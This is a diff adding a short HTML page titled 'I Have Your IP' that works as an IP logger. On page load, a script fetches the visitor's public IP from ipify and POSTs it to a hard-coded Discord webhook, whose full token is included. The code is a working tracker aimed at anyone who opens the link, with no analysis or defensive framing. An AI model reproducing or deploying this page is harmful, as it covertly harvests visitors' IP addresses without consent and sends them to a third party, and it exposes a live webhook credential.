@@ -1,0 +1,35 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <link rel="stylesheet" href="styles.css">
+  <link rel="icon" href="ip.ico" sizes="500x500"
+</head>
+<body>
+
+<h1>𝗜 𝗛𝗮𝘃𝗲 𝗬𝗼𝘂𝗿 𝗜𝗣</h1>
+<p>Don't click unfamiliar links</p>
+
+
+  <script>
+function getIP(json) {
+  var request = new XMLHttpRequest(); //making a request for the webhook
+      request.open("POST", "https://discord.com/api/webhooks/982503354611671050/yXNKfpKxtubdfdiZ-TkwownvHNkStx6JEGWfM4Bmg68MNSoiSQmRpDliPBLsk4eBsT8o");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var params = {
+        username: "Ip Logger",
+        avatar_url: "https://drive.google.com/uc?export=download&id=1biNXEuVe5Xzc6zxBLXDH6JbUVzKa4oBK",
+        content: "**IP:** __*"  + json.ip + "*__"
+      }
+   //just a webhook parameters such as avatar,name,message
+
+      request.send(JSON.stringify(params));
+    }
+
+</script>
+<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+
+</body>
+</html>
